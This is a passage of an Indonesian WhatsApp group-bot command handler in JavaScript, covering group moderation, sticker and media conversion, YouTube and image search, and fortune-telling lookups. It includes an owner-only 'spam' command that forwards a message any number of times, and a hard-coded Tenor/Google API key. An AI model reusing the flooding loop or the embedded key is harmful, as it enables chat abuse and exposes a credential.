await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => anjay(`Sukses Menutup Edit Info Group`)).catch((err) => anjay(jsonformat(err)))
 } else {
 const anju = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Edit Info`,
}
haikal.sendMessage(m.chat, anju, `Mode Edit Info`, haikal.user.name, m)
}
}
break
//=================================================//
 case 'mute': {
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return anjay(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
anjay(`${haikal.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return anjay(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
anjay(`${haikal.user.name} telah di unmute di group ini !`)
} else {
 const anaku = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mute Bot`,
}
haikal.sendMessage(m.chat, anaku, `Mute Bot`, haikal.user.name, m)
}
 }
 break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'disable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) anjay('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) return anjay('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return anjay('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return anjay('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./baseikal/lib/binary')
let eb = await eBinary(text)
anjay(eb)
}
break
//=================================================//
case 'dbinary': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./baseikal/lib/binary')
let db = await dBinary(text)
anjay(db)
}
break
//=================================================//
case 'emojimix': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
 case 'attp': case 'ttp': {
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
 if (!text) throw `Example : ${prefix + command} text`
 await haikal.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'haikal', 'morou', m, {asSticker: true})
 }
 break
case 'spam': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) return anjay("Reply pesanya!")
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
//=================================================//
 /*case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) throw respond
if (!text) throw respond
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await quoted.download()
let { floNime } = require('./baseikal/lib/uploader')
let fatGans = await floNime(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
let FaTiH = await haikal.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(FaTiH)
}
 break */
//=================================================// 
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (text.includes('|')) return anjay(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return anjay(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: hw })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: hw })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : hw })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : hw })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:hw})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: hw })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case 'yts': case 'ytsearch': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
haikal.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: hw })
}
break
//=================================================//
case 'google': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
anjay(teks)
})
}
break
//=================================================//
case 'gimage': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
const mllo = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`
}
haikal.sendMessage(m.chat, mllo, { quoted: hw })
})
}
break
//=================================================//
case 'play': case 'ytplay': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
const kals = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`
}
haikal.sendMessage(m.chat, kals, { quoted: hw })
}
break
//=================================================//
case 'ytmp3': case 'ytaudio': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { yta } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted:hw })
}
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted:hw })
}
break
//=================================================//
case 'getmusic': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { yta } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return anjay('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: hw })
}
break
//=================================================//
case 'getvideo': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return anjay('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: hw })
}
break
//=================================================//
case 'pinterest': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: hw })
}
break
//=================================================//
case 'couple': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: hw })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: hw })
}
break
//=================================================//
case 'coffe': case 'kopi': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(m.chat, ko, { quoted: hw })
}
break
//=================================================//
case 'wallpaper': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./baseikal/lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mlo = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
}
haikal.sendMessage(m.chat, mlo, { quoted: hw })
}
break
//=================================================//
case 'wikimedia': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./baseikal/lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mbk = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`
}
haikal.sendMessage(m.chat, mbk, { quoted: hw })
}
break
//=================================================//
case 'quotesanime': case 'quoteanime': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let { quotesAnime } = require('./baseikal/lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]

const anualas = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`
}
haikal.sendMessage(m.chat, anualas, { quoted: hw })
}
break
//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal Gans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal|Putri`
let [nama1, nama2] = text.split`|`
